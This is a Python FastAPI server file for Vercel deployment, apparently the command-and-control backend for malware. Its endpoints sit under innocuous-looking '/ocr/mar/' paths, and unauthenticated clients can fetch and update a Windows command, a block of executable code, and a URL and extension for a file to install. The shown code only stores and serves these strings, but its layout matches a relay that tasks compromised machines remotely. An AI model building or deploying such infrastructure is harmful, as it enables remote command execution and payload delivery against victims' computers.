import os
from fastapi import FastAPI, Query, Body
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from mangum import Mangum # Import Mangum

# Pydantic model
class Script(BaseModel):
    code: str

# --- Global State Variables ---
# WARNING: ON VERCEL, THESE WILL NOT PERSIST RELIABLY BETWEEN REQUESTS.
# Vercel functions are stateless. You MUST use an external database for persistence.
# This code will "run" but the data in these globals will be highly unpredictable.
url_file_data = {
    "url_file": None,
    "extention": None
}
code_exe_data = None
dec_data = {
    "option": None,
}
command_data = {
    "windows": None,
}
# --- End Global State Variables ---

app = FastAPI() # Create your FastAPI app instance

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/ocr/mar/evente")
def get_evente_status():
    # This will return the initial state or whatever was set by a previous call
    # IF that previous call was handled by the exact same warm function instance.
    # Do not rely on this for persistence.
    return dec_data

@app.put("/ocr/mar/evente_updat")
def update_evente_status(mise: str = Query(...)):
    global dec_data
    dec_data["option"] = mise # This change is only for the current function instance
    return dec_data

@app.get("/ocr/mar/command")
def get_command_details():
    return command_data

@app.put("/ocr/mar/command/updat")
def update_command_details(new_command: str = Query(...)):
    global command_data
    command_data["windows"] = new_command
    return command_data

@app.get("/ocr/mar/code")
def get_executable_code():
    return {"code": code_exe_data}

@app.put("/ocr/mar/code/updat")
def update_executable_code(new_code_payload: Script = Body(...)):
    global code_exe_data
    try:
        code_exe_data = str(new_code_payload.code)
        return {"status": "success", "message": "Code updated successfully (in this instance).", "updated_code": code_exe_data}
    except Exception as e:
        return {"status": "error", "message": f"Failed to update code: {str(e)}"}

@app.get("/ocr/mar/install_file")
def get_install_file_info():
    return url_file_data

@app.put("/ocr/mar/install_file/updat")
def update_install_file_info(url: str = Query(...), extension: str = Query(...)):
    global url_file_data
    url_file_data["url_file"] = url
    url_file_data["extention"] = extension
    return url_file_data

# Vercel handler: Mangum wraps the FastAPI app
# The 'handler' variable is what Vercel will look for by default in Python serverless functions.
handler = Mangum(app)

# Note: The `uvicorn main:app --host 0.0.0.0 --port 8000` command is for traditional servers,
# not for Vercel serverless deployment.
